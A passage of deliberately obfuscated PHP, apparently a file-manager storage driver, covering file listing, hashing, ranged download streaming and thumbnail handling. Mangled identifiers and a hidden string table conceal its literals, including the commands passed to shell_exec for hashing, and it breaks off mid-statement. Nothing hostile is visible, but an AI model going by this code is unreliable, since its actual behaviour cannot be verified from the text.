$æ’¡ÖÔ) { } public function exist($ô‡¥¶ ˜) { } public function findByHash($Òƒ£¯‹„ = '', $¶­˜°ê = '') { return !1; } public function isFile($®§¼úûÅ) { } public function isFolder($ğÍÆêì”) { } public function size($øèòì×) { } public function info($é÷Ø„) { } public function infoSimple($éãïº©) { return $this->info($éãïº©); } public function infoAuth($Ç²‹¯) { return $this->info($Ç²‹¯); } public function infoFull($¸ãÃôä) { return $this->info($¸ãÃôä); } public function infoFullSimple($¯Ú© ÒÎ) { return $this->info($¯Ú© ÒÎ); } public function infoWithChildren($ôÒ’¤§Ò) { $ÊËÁ´÷‘ =& $_SERVER[ü¢ÙÊñÛ]; static $ã«ãÂŠ¼ = array(); if (isset($ã«ãÂŠ¼[$ôÒ’¤§Ò])) { return $ã«ãÂŠ¼[$ôÒ’¤§Ò]; } $¿Ïè¬Ï³ = $this->info($ôÒ’¤§Ò); if ($¿Ïè¬Ï³ && $¿Ïè¬Ï³[$ÊËÁ´÷‘[43]] == $ÊËÁ´÷‘[89]) { $ÖÃ¥£“¯ = array($ÊËÁ´÷‘[90] => 0, $ÊËÁ´÷‘[91] => 0, $ÊËÁ´÷‘[92] => 0); $this->infoChildren($ôÒ’¤§Ò, $ÖÃ¥£“¯); $¿Ïè¬Ï³[$ÊËÁ´÷‘[90]] = $ÖÃ¥£“¯[$ÊËÁ´÷‘[90]]; $¿Ïè¬Ï³[$ÊËÁ´÷‘[93]] = array($ÊËÁ´÷‘[94] => $ÖÃ¥£“¯[$ÊËÁ´÷‘[91]], $ÊËÁ´÷‘[95] => $ÖÃ¥£“¯[$ÊËÁ´÷‘[92]]); $ã«ãÂŠ¼[$ôÒ’¤§Ò] = $¿Ïè¬Ï³; } return $¿Ïè¬Ï³; } public function listPath($Ú´Õ³üÂ, $ëÀ•„ıÅ = false) { } public function has($®Å¾Üí, $ÊÖšç«“ = false, $¢–ôƒ¦™ = false) { } public function canRead($ıèè¯¾¢) { } public function canWrite($å¤îš…) { } public function getContent($„Òêıú–) { } public function setContent($¼ò„ŞË¯, $›æ¹­”Ö = '') { } protected function infoChildren($›å‡·ƒü, &$©ÀäóÎ) { $®Ò——Ú® =& $_SERVER[ü¢ÙÊñÛ]; check_abort_echo(); $—ö†¶¸‡ = $this->listPath($›å‡·ƒü, !0); $—ö†¶¸‡ = array_merge($—ö†¶¸‡[$®Ò——Ú®[96]], $—ö†¶¸‡[$®Ò——Ú®[97]]); foreach ($—ö†¶¸‡ as $˜ÆÀÕó¥) { if ($˜ÆÀÕó¥[$®Ò——Ú®[43]] == $®Ò——Ú®[89]) { $©ÀäóÎ[$®Ò——Ú®[92]]++; $öåª¯²× = $this->getPathInner($˜ÆÀÕó¥[$®Ò——Ú®[98]]); $this->infoChildren($öåª¯²×, $©ÀäóÎ); } else { $©ÀäóÎ[$®Ò——Ú®[91]]++; $©ÀäóÎ[$®Ò——Ú®[90]] += $˜ÆÀÕó¥[$®Ò——Ú®[90]]; } } } public function fileSubstr($‹ó¾¢é¹, $ûº¥©Áı, $òŸ˜ŒÜ) { } public function listAll($õ‘ï” ) { } public function listAllMake($Ì”˜•¹í, &$ıèó×ØŒ) { $¹ÌÁß°ü =& $_SERVER[ü¢ÙÊñÛ]; check_abort_echo(); $ã«¿ÈËÖ = $this->listPath($Ì”˜•¹í, !0); if (!$ã«¿ÈËÖ) { return; } $Ûê™ó’ = array_merge($ã«¿ÈËÖ[$¹ÌÁß°ü[96]], $ã«¿ÈËÖ[$¹ÌÁß°ü[97]]); foreach ($Ûê™ó’ as $µÔü¯ã„) { $’ş–ƒúÆ = $µÔü¯ã„[$¹ÌÁß°ü[43]] == $¹ÌÁß°ü[89]; $éé‰¦×× = array($¹ÌÁß°ü[98] => $µÔü¯ã„[$¹ÌÁß°ü[98]], $¹ÌÁß°ü[89] => $’ş–ƒúÆ); if (isset($µÔü¯ã„[$¹ÌÁß°ü[90]])) { $éé‰¦××[$¹ÌÁß°ü[90]] = $µÔü¯ã„[$¹ÌÁß°ü[90]]; } if (isset($µÔü¯ã„[$¹ÌÁß°ü[99]])) { $éé‰¦××[$¹ÌÁß°ü[99]] = $µÔü¯ã„[$¹ÌÁß°ü[99]]; } if (!$’ş–ƒúÆ) { $ıèó×ØŒ[] = $éé‰¦××; continue; } $ıèó×ØŒ[] = $éé‰¦××; $òÎâ¿íÆ = $µÔü¯ã„[$¹ÌÁß°ü[98]]; $íÍñÙ = $this->pathDriver; if (substr($µÔü¯ã„[$¹ÌÁß°ü[98]], 0, strlen($íÍñÙ)) == $íÍñÙ) { $òÎâ¿íÆ = substr($òÎâ¿íÆ, strlen($íÍñÙ)); } $this->listAllMake($òÎâ¿íÆ, $ıèó×ØŒ); } } public function listAllSimple($åÑ§æ¾Ş, $­ßõ¤™¼ = false) { $ã€§ĞŒ… = $this->listAll($åÑ§æ¾Ş); return $this->listAllSimpleMake($ã€§ĞŒ…, $this->getPathOuter($åÑ§æ¾Ş), $­ßõ¤™¼); } public function listAllSimpleMake($ê÷§õ©·, $½ñúä—, $Ë‡ÑîÁ ) { $Î¦—Ûà‡ =& $_SERVER[ü¢ÙÊñÛ]; $Ü„ÓÀà = array(); $½ñúä— = rtrim(get_path_father($½ñúä—), $Î¦—Ûà‡[18]) . $Î¦—Ûà‡[18]; foreach ($ê÷§õ©· as $ÛË‚©) { $ÖÄ½–‡ = array($Î¦—Ûà‡[98] => $ÛË‚©[$Î¦—Ûà‡[98]], $Î¦—Ûà‡[100] => $ÛË‚©[$Î¦—Ûà‡[98]], $Î¦—Ûà‡[89] => $ÛË‚©[$Î¦—Ûà‡[89]]); if (isset($ÛË‚©[$Î¦—Ûà‡[90]]) && !$ÛË‚©[$Î¦—Ûà‡[89]]) { $ÖÄ½–‡[$Î¦—Ûà‡[90]] = $ÛË‚©[$Î¦—Ûà‡[90]]; } if (isset($ÛË‚©[$Î¦—Ûà‡[99]])) { $ÖÄ½–‡[$Î¦—Ûà‡[99]] = $ÛË‚©[$Î¦—Ûà‡[99]]; } if (is_array($ÛË‚©[$Î¦—Ûà‡[101]])) { $ÖÄ½–‡[$Î¦—Ûà‡[100]] = $ÛË‚©[$Î¦—Ûà‡[101]][$Î¦—Ûà‡[98]]; $ÖÄ½–‡[$Î¦—Ûà‡[90]] = $ÛË‚©[$Î¦—Ûà‡[101]][$Î¦—Ûà‡[90]]; $ÖÄ½–‡[$Î¦—Ûà‡[99]] = $ÛË‚©[$Î¦—Ûà‡[101]][$Î¦—Ûà‡[99]]; } else { if (substr($ÛË‚©[$Î¦—Ûà‡[98]], 0, strlen($½ñúä—)) == $½ñúä—) { $ÖÄ½–‡[$Î¦—Ûà‡[98]] = substr($ÛË‚©[$Î¦—Ûà‡[98]], strlen($½ñúä—)); } } $‚·°ÀÌÍ = $ÛË‚©[$Î¦—Ûà‡[89]] ? $Î¦—Ûà‡[18] : $Î¦—Ûà‡[22]; $ÖÄ½–‡[$Î¦—Ûà‡[100]] = rtrim($ÖÄ½–‡[$Î¦—Ûà‡[100]], $Î¦—Ûà‡[18]) . $‚·°ÀÌÍ; $ÖÄ½–‡[$Î¦—Ûà‡[98]] = $Î¦—Ûà‡[18] . trim($ÖÄ½–‡[$Î¦—Ûà‡[98]], $Î¦—Ûà‡[18]) . $‚·°ÀÌÍ; if (!$Ë‡ÑîÁ ) { $òˆ¨è…© = explode($Î¦—Ûà‡[18], trim($ÖÄ½–‡[$Î¦—Ûà‡[98]], $Î¦—Ûà‡[18])); $ÖÄ½–‡[$Î¦—Ûà‡[98]] = $Î¦—Ûà‡[18] . implode($Î¦—Ûà‡[18], array_slice($òˆ¨è…©, 1)) . $‚·°ÀÌÍ; } $Ü„ÓÀà[] = $ÖÄ½–‡; } return array_sort_by($Ü„ÓÀà, $Î¦—Ûà‡[98]); } public function upload($øØ¢½, $º‰ğªñá, $çêŞœâ = false, $ñÏ¯•í¼ = REPEAT_REPLACE) { } public function uploadFileByID($ç”æ”µØ, $›Å˜îßĞ, $×”¿Ã¼) { } public function uploadFileByPath($ÄÄé¨–°, $Êıáå½, $‘ÍŒ½ß = array()) { } public function isUploadServer() { $Šñ‘ÚÒ =& $_SERVER[ü¢ÙÊñÛ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Šñ‘ÚÒ[102]) { return !0; } return $GLOBALS[$Šñ‘ÚÒ[16]][$Šñ‘ÚÒ[103]][$Šñ‘ÚÒ[104]]; } public function isFileOutServer() { $š¦õ’áÙ =& $_SERVER[ü¢ÙÊñÛ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $š¦õ’áÙ[102]) { return !0; } return $GLOBALS[$š¦õ’áÙ[16]][$š¦õ’áÙ[103]][$š¦õ’áÙ[105]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¦Æø§¶ö) { $¶ÇÍı¸ç =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->isCdnHost()) { return $¦Æø§¶ö; } return str_replace(trim(get_url_root($¦Æø§¶ö), $¶ÇÍı¸ç[18]), trim($this->cdnHost, $¶ÇÍı¸ç[18]), $¦Æø§¶ö); } public function uploadLink($µÀÌö², $Ş•›ÎúÌ = 0) { $ç•µúÑ¬ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isUploadServer()) { return; } $·´£üÄê = $this->getType(); if (!in_array($·´£üÄê, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $×¡ø¾†º = 1024 * 1024 * 10; $ÜîÓÅù­ = $Ş•›ÎúÌ <= $×¡ø¾†º ? $ç•µúÑ¬[106] : $ç•µúÑ¬[107]; $ç¦Š«ìÌ = (!$Ş•›ÎúÌ ? 1 : ceil($Ş•›ÎúÌ / pow(1024, 3))) * 3600 * 4; $ğÚœûû = $this->{$ÜîÓÅù­}($µÀÌö², $ç¦Š«ìÌ); if ($ğÚœûû) { $ğÚœûû[$ç•µúÑ¬[108]] = $µÀÌö²; $ğÚœûû[$ç•µúÑ¬[109]] = $·´£üÄê; } return $ğÚœûû; } public function uploadFormData($Ò¸¿µ„ı, $·‰Õ¥ƒ = 3600) { } public function uploadMultiData($ë Ùâ¬Â, $ä¦ïú† = 3600) { } public function multiUploadFormData($—Á™…â, $ó³ôÕ®… = 3600) { return $this->uploadMultiData($—Á™…â, $ó³ôÕ®…); } public function download($ÕÁü¼Ñ„, $ŒØ–”Çè) { } public function ext($©æ‹ƒï) { $ËœÄüæ =& $_SERVER[ü¢ÙÊñÛ]; if (strpos($©æ‹ƒï, $ËœÄüæ[18]) === -1) { $±‚²ˆß = $©æ‹ƒï; } else { $±‚²ˆß = $this->pathThis($©æ‹ƒï); } $á•¶ÂÙº = $ËœÄüæ[22]; if (strstr($±‚²ˆß, $ËœÄüæ[20])) { $á•¶ÂÙº = substr($±‚²ˆß, strrpos($±‚²ˆß, $ËœÄüæ[20]) + 1); $á•¶ÂÙº = strtolower($á•¶ÂÙº); } if (strlen($á•¶ÂÙº) > 3 && preg_match($ËœÄüæ[110], $á•¶ÂÙº, $“Á´·É¾)) { $á•¶ÂÙº = $ËœÄüæ[22]; } return $á•¶ÂÙº; } public function pathThis($Õ¶¾à) { $ŠÀìÛ’ =& $_SERVER[ü¢ÙÊñÛ]; $Õ¶¾à = str_replace($ŠÀìÛ’[111], $ŠÀìÛ’[18], rtrim($Õ¶¾à, $ŠÀìÛ’[18])); $ŸÄÈ—Ç = strrpos($Õ¶¾à, $ŠÀìÛ’[18]); if ($ŸÄÈ—Ç === !1) { return $Õ¶¾à; } return substr($Õ¶¾à, $ŸÄÈ—Ç + 1); } public function pathFather($ĞØáßÆŒ) { $¡ë¤ˆ¼ï =& $_SERVER[ü¢ÙÊñÛ]; $ĞØáßÆŒ = str_replace($¡ë¤ˆ¼ï[111], $¡ë¤ˆ¼ï[18], rtrim($ĞØáßÆŒ, $¡ë¤ˆ¼ï[18])); $ù£ÉÔÂ¦ = strrpos($ĞØáßÆŒ, $¡ë¤ˆ¼ï[18]); if ($ù£ÉÔÂ¦ === !1) { return $¡ë¤ˆ¼ï[22]; } return substr($ĞØáßÆŒ, 0, $ù£ÉÔÂ¦ + 1); } public function hashSimple($Œ ãı˜‡) { $¾®“Êß× =& $_SERVER[ü¢ÙÊñÛ]; if (!$Œ ãı˜‡) { return md5($¾®“Êß×[22]); } $ ¬˜¯ª = $this->size($Œ ãı˜‡); $·òŞËå = 200; $›âºö·ß = 50; if ($ ¬˜¯ª <= $·òŞËå * $›âºö·ß) { return $this->hashMd5($Œ ãı˜‡) . $ ¬˜¯ª; } $Àç¦Å› = intval($ ¬˜¯ª / $›âºö·ß); $Ê×äŠé = $¾®“Êß×[22]; for ($µì‹ó¿ = 0; $µì‹ó¿ < $›âºö·ß; $µì‹ó¿++) { $Ê×äŠé .= $this->fileSubstr($Œ ãı˜‡, $Àç¦Å› * $µì‹ó¿, $·òŞËå); } $Ê×äŠé .= $this->fileSubstr($Œ ãı˜‡, $ ¬˜¯ª - $·òŞËå, $·òŞËå); return md5($Ê×äŠé) . $ ¬˜¯ª; } public static $md5Cache = array(); public function hashMd5($´ßâó¤) { if (!$´ßâó¤) { return md5($_SERVER[ü¢ÙÊñÛ][22]); } $´ßâó¤ = $this->iconvSystem($´ßâó¤); if (isset(self::$md5Cache[$´ßâó¤])) { return self::$md5Cache[$´ßâó¤]; } self::$md5Cache[$´ßâó¤] = $this->hashMd5Shell($´ßâó¤); if (!self::$md5Cache[$´ßâó¤]) { self::$md5Cache[$´ßâó¤] = @md5_file($´ßâó¤); } return self::$md5Cache[$´ßâó¤]; } private function hashMd5Shell($Ş²¤µ»ğ) { $û•õ½ğ¶ =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ş²¤µ»ğ) { return md5($û•õ½ğ¶[22]); } if (!function_exists($û•õ½ğ¶[112])) { return !1; } $ÍÜ¼Æ™Ã = array($û•õ½ğ¶[113], $û•õ½ğ¶[114]); $õ’¾Ä¥Ø = Cache::get($û•õ½ğ¶[115]); if (!$õ’¾Ä¥Ø) { $»¨Úóğ = BASIC_PATH . $û•õ½ğ¶[116]; $ÅşÂ’Üş = md5_file($»¨Úóğ); $õ’¾Ä¥Ø = $û•õ½ğ¶[117]; foreach ($ÍÜ¼Æ™Ã as $¤¦‚Ú¬æ) { $˜›¨ğ›¡ = shell_exec($¤¦‚Ú¬æ . "\x20\x22{$»¨Úóğ}\x22"); if ($˜›¨ğ›¡ && substr(trim($˜›¨ğ›¡), 0, 32) == $ÅşÂ’Üş) { $õ’¾Ä¥Ø = $¤¦‚Ú¬æ; break; } } Cache::set($û•õ½ğ¶[115], $õ’¾Ä¥Ø, 3600); } if ($õ’¾Ä¥Ø == $û•õ½ğ¶[117]) { return !1; } $˜›¨ğ›¡ = shell_exec($õ’¾Ä¥Ø . "\40\x22{$Ş²¤µ»ğ}\x22"); $˜›¨ğ›¡ = str_replace($û•õ½ğ¶[118], $û•õ½ğ¶[22], $˜›¨ğ›¡); return substr($˜›¨ğ›¡, 0, 32); } public function link($¿„ÁÁ´) { return $¿„ÁÁ´; } public function fileOut($Ã“¹’…˜, $†´ïå»ı = false, $ÑÎ°˜ì = false, $éëÏÅ‹ = '') { $¾åªúŞ =& $_SERVER[ü¢ÙÊñÛ]; $this->cacheMethod(null, null); if (!$Ã“¹’…˜ || !$this->exist($Ã“¹’…˜)) { show_json(LNG($¾åªúŞ[119]), !1, $ÑÎ°˜ì); } $•Ñ‹Î¯” = $this->getType() == $¾åªúŞ[120]; $ê™‘ÒÓ€ = $GLOBALS[$¾åªúŞ[16]][$¾åªúŞ[103]][$¾åªúŞ[121]][$¾åªúŞ[122]]; $ŠÅÁ€Ä‘ = (double) $GLOBALS[$¾åªúŞ[16]][$¾åªúŞ[103]][$¾åªúŞ[121]][$¾åªúŞ[123]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $öıö¼ƒ = $this->infoFull($Ã“¹’…˜); $¸»©‡Š = $öıö¼ƒ[$¾åªúŞ[90]]; $ìÔÂÄÌÍ = gmdate($¾åªúŞ[124], $öıö¼ƒ[$¾åªúŞ[99]]); $í½÷‰÷ = $ÑÎ°˜ì ? $ÑÎ°˜ì : $this->iconvApp($öıö¼ƒ[$¾åªúŞ[42]]); $¦÷¼á¤İ = 0; $œäªª—­ = $¸»©‡Š - 1; $¸ä¸ª­¯ = $this->ext($í½÷‰÷); if (in_array($¸ä¸ª­¯, array($¾åªúŞ[125], $¾åªúŞ[126], $¾åªúŞ[127], $¾åªúŞ[128]))) { $¸ä¸ª­¯ = $¾åªúŞ[129]; } if (in_array($¸ä¸ª­¯, array($¾åªúŞ[130]))) { $¸ä¸ª­¯ = $¾åªúŞ[131]; } if (!$éëÏÅ‹) { $éëÏÅ‹ = md5($ìÔÂÄÌÍ . $¸»©‡Š); } $éëÏÅ‹ = $¾åªúŞ[132] . $éëÏÅ‹ . $¾åªúŞ[132]; $°ª¢î•½ = get_file_mime($¸ä¸ª­¯); $“Öìş•É = !0; $“Öìş•É = isset($_GET[$¾åªúŞ[133]]) ? !1 : !0; if ($†´ïå»ı === !1 && !mime_support($°ª¢î•½)) { $°ª¢î•½ = $¾åªúŞ[134]; } header($¾åªúŞ[135]); header($¾åªúŞ[136] . $°ª¢î•½); $‰ŞŸ±Ö· = rawurlencode($í½÷‰÷); $‰ŞŸ±Ö· = $¾åªúŞ[132] . $‰ŞŸ±Ö· . $¾åªúŞ[137] . $‰ŞŸ±Ö·; if ($†´ïå»ı) { header($¾åªúŞ[138]); header($¾åªúŞ[139] . $‰ŞŸ±Ö·); } else { if ($“Öìş•É) { header($¾åªúŞ[140] . $‰ŞŸ±Ö·); } } $’ÉãŞ‡Œ = 3600 * 24 * 30; header($¾åªúŞ[141]); header($¾åªúŞ[142]); header($¾åªúŞ[143] . $’ÉãŞ‡Œ); header($¾åªúŞ[144] . gmdate($¾åªúŞ[124], time() + $’ÉãŞ‡Œ) . $¾åªúŞ[145]); if (isset($_SERVER[$¾åªúŞ[146]]) && strtotime($_SERVER[$¾åªúŞ[146]]) == $öıö¼ƒ[$¾åªúŞ[99]]) { header($¾åªúŞ[147], !0, 304); die; } if (isset($_SERVER[$¾åªúŞ[148]]) && $_SERVER[$¾åªúŞ[148]] == $éëÏÅ‹) { header($¾åªúŞ[149] . $éëÏÅ‹, !0, 304); die; } header($¾åªúŞ[149] . $éëÏÅ‹); header($¾åªúŞ[150] . $ìÔÂÄÌÍ . $¾åªúŞ[145]); header($¾åªúŞ[151] . $í½÷‰÷); header($¾åªúŞ[152]); header($¾åªúŞ[153] . $¸»©‡Š); header($¾åªúŞ[154]); Hook::trigger($¾åªúŞ[155], $Ã“¹’…˜, $¸»©‡Š, $í½÷‰÷, $¸ä¸ª­¯); if (!$†´ïå»ı && $¸ä¸ª­¯ == $¾åªúŞ[156]) { if ($¸»©‡Š > 1024 * 1024 * 5) { die; } $áÅ«•Æ = $this->getContent($Ã“¹’…˜); $áÅ«•Æ = Html::clearSVG($áÅ«•Æ); header($¾åªúŞ[157] . strlen($áÅ«•Æ)); echo $áÅ«•Æ; die; } $Ğ—¢³ú = strtolower($_SERVER[$¾åªúŞ[158]]); if ($•Ñ‹Î¯” && $Ğ—¢³ú && $ê™‘ÒÓ€) { if (strstr($Ğ—¢³ú, $¾åªúŞ[159])) { header($¾åªúŞ[160] . $Ã“¹’…˜); } else { if (strstr($Ğ—¢³ú, $¾åªúŞ[161])) { header($¾åªúŞ[162] . $Ã“¹’…˜); } else { if (strstr($Ğ—¢³ú, $¾åªúŞ[163])) { header($¾åªúŞ[164] . $Ã“¹’…˜); } } } if ($ŠÅÁ€Ä‘) { header($¾åªúŞ[165] . $ŠÅÁ€Ä‘); } return; } if (isset($_SERVER[$¾åªúŞ[166]])) { if (preg_match($¾åªúŞ[167], $_SERVER[$¾åªúŞ[166]], $ğûšÁ·Ï)) { $¦÷¼á¤İ = intval($ğûšÁ·Ï[1]); $¦÷¼á¤İ = $¦÷¼á¤İ <= 0 ? 0 : ($¦÷¼á¤İ >= $œäªª—­ ? $œäªª—­ : $¦÷¼á¤İ); if (!empty($ğûšÁ·Ï[2])) { $•÷Ù—öœ = intval($ğûšÁ·Ï[2]); $œäªª—­ = $•÷Ù—öœ < $¦÷¼á¤İ ? $¦÷¼á¤İ : ($•÷Ù—öœ >= $œäªª—­ ? $œäªª—­ : $•÷Ù—öœ); } } header($¾åªúŞ[168]); header("\103\x6f\156\x74\x65\x6e\164\x2d\x52\141\156\x67\x65\x3a\40\142\x79\x74\145\x73\40{$¦÷¼á¤İ}\x2d{$œäªª—­}\57" . $¸»©‡Š); } else { header($¾åªúŞ[169]); } header($¾åªúŞ[170]); header($¾åªúŞ[171]); $è¸œß¼Ş = !0; if ($_SERVER[$¾åªúŞ[172]] == $¾åªúŞ[173] && $¸»©‡Š > 1204 * 1024 * 1024 * 2) { $è¸œß¼Ş = !1; } if ($è¸œß¼Ş) { header($¾åªúŞ[174] . ($œäªª—­ - $¦÷¼á¤İ + 1)); } if ($_SERVER[$¾åªúŞ[175]] == $¾åªúŞ[176]) { return; } $¹£¹–÷ = array($¾åªúŞ[177] => !1, $¾åªúŞ[178] => $¦÷¼á¤İ, $¾åªúŞ[179] => $œäªª—­, $¾åªúŞ[180] => $¸ä¸ª­¯, $¾åªúŞ[181] => $öıö¼ƒ, $¾åªúŞ[182] => $¾åªúŞ[22], $¾åªúŞ[183] => 0); $¹£¹–÷ = Hook::filter($¾åªúŞ[184], $¹£¹–÷); $Àœ¨ß‡È = 1024 * 300; $ëñø‹Š = 0; if ($ŠÅÁ€Ä‘) { $ëñø‹Š = intval(1000 * 1000 * ($Àœ¨ß‡È / $ŠÅÁ€Ä‘)); } while ($¦÷¼á¤İ <= $œäªª—­) { $ºÓ¼†Ú = timeFloat(); check_abort(); $äÙßş = $œäªª—­ - $¦÷¼á¤İ + 1; if ($äÙßş <= $Àœ¨ß‡È) { $Àœ¨ß‡È = $äÙßş; } $áÅ«•Æ = $this->fileSubstr($Ã“¹’…˜, $¦÷¼á¤İ, $Àœ¨ß‡È); if ($¹£¹–÷[$¾åªúŞ[177]]) { $¹£¹–÷[$¾åªúŞ[182]] = $áÅ«•Æ; $¹£¹–÷[$¾åªúŞ[183]] = $¦÷¼á¤İ; $¹£¹–÷ = Hook::filter($¾åªúŞ[185], $¹£¹–÷); $áÅ«•Æ = $¹£¹–÷[$¾åªúŞ[182]]; } echo $áÅ«•Æ; $¦÷¼á¤İ += $Àœ¨ß‡È; if ($Àœ¨ß‡È == $äÙßş) { $¦÷¼á¤İ = $œäªª—­ + 1; } if ($ëñø‹Š) { $ÂóÌÂ—ó = intval(1000 * 1000 * (timeFloat() - $ºÓ¼†Ú)); $‹¤‚•¨¼ = $ëñø‹Š - $ÂóÌÂ—ó; if ($‹¤‚•¨¼ > 5) { usleep($‹¤‚•¨¼); } } } } public function fileOutServer($ª½¡Å¡, $™ø‡¨‰Ã = false, $¦Ş‡¢ò§ = false, $Ÿİñ…ü´ = '') { $this->fileOut($ª½¡Å¡, $™ø‡¨‰Ã, $¦Ş‡¢ò§, $Ÿİñ…ü´); } public function fileOutLink($¨îÊ•¼ş) { header($_SERVER[ü¢ÙÊñÛ][186] . $¨îÊ•¼ş); die; } public function cacheMethod($­¾ûÓ¼×, $£ ÌÂ», $™ÀÏâáÒ = null) { $®ÌƒÔëÙ =& $_SERVER[ü¢ÙÊñÛ]; static $¶º´¶—Æ = array(); $’‰¿‰»› = $£ ÌÂ» ? ltrim($this->getPathOuter($£ ÌÂ»), $®ÌƒÔëÙ[18]) : $®ÌƒÔëÙ[22]; $çÂªù¥Ò = $®ÌƒÔëÙ[187] . $­¾ûÓ¼× . $®ÌƒÔëÙ[188] . rtrim($’‰¿‰»›, $®ÌƒÔëÙ[18]); if (is_null($­¾ûÓ¼×)) { $¶º´¶—Æ = array(); return; } if (is_null($£ ÌÂ»)) { foreach ($¶º´¶—Æ as $çÂªù¥Ò => $æˆğÌÇ) { if (!strstr($çÂªù¥Ò, $®ÌƒÔëÙ[187] . $­¾ûÓ¼× . $®ÌƒÔëÙ[189])) { continue; } unset($¶º´¶—Æ[$çÂªù¥Ò]); } return; } if (!is_null($™ÀÏâáÒ)) { $¶º´¶—Æ[$çÂªù¥Ò] = $™ÀÏâáÒ; return; } $°—ßô = isset($¶º´¶—Æ[$çÂªù¥Ò]) ? $¶º´¶—Æ[$çÂªù¥Ò] : null; if (!is_null($°—ßô)) { return $°—ßô; } $°—ßô = $this->{$­¾ûÓ¼×}($£ ÌÂ»); $¶º´¶—Æ[$çÂªù¥Ò] = $°—ßô; return $°—ßô; } public function cacheMethodInfoSet($ïøÉÌÂÄ, $œ†ßŸ§, $¤Æ’ä¬Â = false) { $‹¥ù÷Ñƒ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‹¥ù÷Ñƒ[190], $ïøÉÌÂÄ, $œ†ßŸ§); $this->cacheMethod($‹¥ù÷Ñƒ[191], $ïøÉÌÂÄ, $œ†ßŸ§ ? !1 : !0); if (is_array($¤Æ’ä¬Â)) { $this->cacheMethod($‹¥ù÷Ñƒ[192], $ïøÉÌÂÄ, $¤Æ’ä¬Â); } } public function fileOutImage($Â†í¾Û , $š¥«éö = 250) { $¹ö¢Åí‚ =& $_SERVER[ü¢ÙÊñÛ]; set_timeout(); if (substr($Â†í¾Û , 0, 4) == $¹ö¢Åí‚[163]) { $this->fileOutLink($Â†í¾Û ); } $êÃ§—ç¢ = $this->info($Â†í¾Û ); $çÑ¤Ğ°® = !1; $ŠŸ’Ö¸Ê = isset($GLOBALS[$¹ö¢Åí‚[193]]) ? $GLOBALS[$¹ö¢Åí‚[193]] : array(); if ($ŠŸ’Ö¸Ê && $ŠŸ’Ö¸Ê[$¹ö¢Åí‚[194]] == $êÃ§—ç¢[$¹ö¢Åí‚[98]]) { $êÃ§—ç¢ = $ŠŸ’Ö¸Ê; $‡êıéğ = $êÃ§—ç¢[$¹ö¢Åí‚[195]]; if ($‡êıéğ && isset($‡êıéğ[$¹ö¢Åí‚[196]])) { if ($‡êıéğ[$¹ö¢Åí‚[196]] <= $š¥«éö && $‡êıéğ[$¹ö¢Åí‚[197]] <= $š¥«éö) { $çÑ¤Ğ°® = !0; } } } if ($êÃ§—ç¢[$¹ö¢Åí‚[90]] <= 1024 * 50 || $çÑ¤Ğ°® || !function_exists($¹ö¢Åí‚[198]) || $êÃ§—ç¢[$¹ö¢Åí‚[180]] == $¹ö¢Åí‚[199]) { return $this->fileOut($Â†í¾Û , !1, $êÃ§—ç¢[$¹ö¢Åí‚[42]]); } $•ƒº€ò = kodIO::hashPath($êÃ§—ç¢); $òÒ¬âƒĞ = "\x63\x6f\x76\x65\x72\x5f{$•ƒº€ò}\137{$š¥«éö}\x2e\160\x6e\x67"; $¾½³Œ„™ = IO_PATH_SYSTEM_TEMP . $¹ö¢Åí‚[200]; $„•ğ÷òõ = IO::infoFullSimple($¾½³Œ„™); $õ‚Ï ¾Â = $„•ğ÷òõ && is_array($„•ğ÷òõ) ? $„•ğ÷òõ[$¹ö¢Åí‚[98]] : $¹ö¢Åí‚[22]; if (!$õ‚Ï ¾Â) { $õ‚Ï ¾Â = IO::mkdir($¾½³Œ„™); } if ($êÃ§—ç¢[$¹ö¢Åí‚[201]] == $¹ö¢Åí‚[202] && isset($êÃ§—ç¢[$¹ö¢Åí‚[203]]) && $êÃ§—ç¢[$¹ö¢Åí‚[203]] == kodIO::sourceID($õ‚Ï ¾Â)) { $†«Ûò€¢ = $êÃ§—ç¢[$¹ö¢Åí‚[204]]; if ($š¥«éö <= 500) { $µª…î = preg_replace($¹ö¢Åí‚[205], $¹ö¢Åí‚[206], $êÃ§—ç¢[$¹ö¢Åí‚[42]]); $†«Ûò€¢ = IO::fileNameExist($õ‚Ï ¾Â, $µª…î); } return IO::fileOut(KodIO::make($†«Ûò€¢), !1, $êÃ§—ç¢[$¹ö¢Åí‚[42]]); } $êáêÏíï = IO::fileNameExist($õ‚Ï ¾Â, $òÒ¬âƒĞ); if ($êáêÏíï) { return IO::fileOut(KodIO::make($êáêÏíï), !1, $êÃ§—ç¢[$¹ö¢Åí‚[42]]); } if ($š¥«éö > 1000) { $this->makeImageCover($õ‚Ï ¾Â, $Â†í¾Û , $òÒ¬âƒĞ, $š¥«éö); $this->makeImageCover($õ‚Ï ¾Â, $Â†í¾Û , "\143\x6f\x76\x65\x72\x5f{$•ƒº€ò}\137\62\x35\60\56\x70\156\147", 250); $êáêÏíï = IO::fileNameExist($õ‚Ï ¾Â, $òÒ¬âƒĞ); if ($êáêÏíï) { return IO::fileOut(KodIO::make($êáêÏíï), !1, $êÃ§—ç¢[$¹ö¢Åí‚[42]]); } die; } if (!kodIO::allowCover($êÃ§—ç¢)) { return $this->fileOut($Â†í¾Û , !1, $êÃ§—ç¢[$¹ö¢Åí‚[42]]); } $ÚÕÔ¨¥± = Cache::get($òÒ¬âƒĞ); if ($ÚÕÔ¨¥± == $¹ö¢Åí‚[207] || $ÚÕÔ¨¥± == $¹ö¢Åí‚[208]) { echo $ÚÕÔ¨¥±; die; } Cache::set($òÒ¬âƒĞ, $¹ö¢Åí‚[208], 60); $ü‹ğˆ¤› = array($õ‚Ï ¾Â, $êÃ§—ç¢[$¹ö¢Åí‚[98]], $òÒ¬âƒĞ, $š¥«éö); $ñÌË“êı = $¹ö¢Åí‚[209] . $êÃ§—ç¢[$¹ö¢Åí‚[90]] . $¹ö¢Åí‚[210] . $òÒ¬âƒĞ . $¹ö¢Åí‚[211] . $êÃ§—ç¢[$¹ö¢Åí‚[42]] . $¹ö¢Åí‚[212] . 